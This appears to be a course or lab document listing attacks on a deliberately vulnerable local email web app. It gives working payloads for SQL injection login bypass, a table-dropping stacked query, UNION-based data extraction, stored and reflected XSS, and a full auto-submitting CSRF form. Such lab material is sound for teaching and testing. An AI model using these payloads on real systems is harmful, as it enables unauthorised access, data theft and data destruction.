# List of possible attacks

## SQL Injection

Unlocks: Get access without password.

On login, enter `<USERNAME>' --` as email, where `<USERNAME>` is the target username.
Enter as password any value.

Works, because the password is checked after the email and the input is not sanitized.

## SQL Injection

Unlocks: Run any SQL statement.

On login, enter `'; <SQL_STATEMENT> --` as email, where `<SQL_STATEMENT>` is any SQL statement, like `'; drop table email; --` for 
example.

## Stored XSS

Unlocks: Run any JavaScript code on sender and receiver of email.

Once logged in, email an existing user with `<script>console.log("pwned");</script>` as the subject or the body of the email.

## Reflected XSS

On registration, pass `<script>console.log("pwned");</script>` as the email to run the script on the victim's browser.

This is equivalent to making a POST request to the following URL:
```
http://localhost:8080/register?name=Name1&surname=Surname1&email=%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E&password=123
```
This URL can be used for a XSRF attack, like shown below.

## Reflected XSS

Feature: Run any JavaScript code.

On registration, enter a valid email and `"><script>console.log("pwned");</script>` as password to run the script on the victim's browser.

This is equivalent to making a POST request to the following URL:
```
http://localhost:8080/register?name=Name3&surname=Surname3&email=user3%40gmail.com&password=%22%3E%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E
```
This URL can be used for a XSRF attack, like shown below.

_Note: The password can be at most 50 characters long due the limit imposed by the database.
Using a longer string throws an exception on the server and does not return the script in the response._

## XSRF

The following HTML page can be forged, such that the session cookie of the victim visiting the page is used to authenticate the sending of an arbitrary email.
In this example `user1@gmail.com` is forced to email `user2@gmail.com`.
```html
<form id="submitMail" class="form-resize" action="http://localhost:8080/email-send"
      method="post">
    <input type="hidden" name="email" value="user1@gmail.com">
    <input class="hidden" name="receiver" placeholder="Receiver" required="" value="user2@gmail.com">
    <input class="hidden" name="subject" placeholder="Subject" required="" value="PWNED">
    <input class="hidden" name="body" placeholder="Body" required="" value="Forced message">
</form>
<script>document.forms.submitMail.submit();</script>
```

_Note: The sender does not have to be the owner of the cookie used to authenticate the request._

## In-band SQL Injection

On login, pass `user1@gmail.com' UNION SELECT @@VERSION, CURRENT_USER, @@VERSION, CURRENT_USER, @@VERSION --` as email to receive a verbose description of the database version and the name of the current database user.

_Note: 5 expressions are used in the select statement, because the user table has 5 columns too._

## In-band SQL Injection

Assume that we know the structure of the database tables.

On login, pass `' UNION SELECT subject, subject, subject, receiver FROM email --` as email to receive 
the subject and the receiver of the first email returned by the database.

_Note: 4 expressions are used in the select statement, because the user table has 4 columns too. 
Only the 3rd and the 4th expression are then extracted and returned by the web server._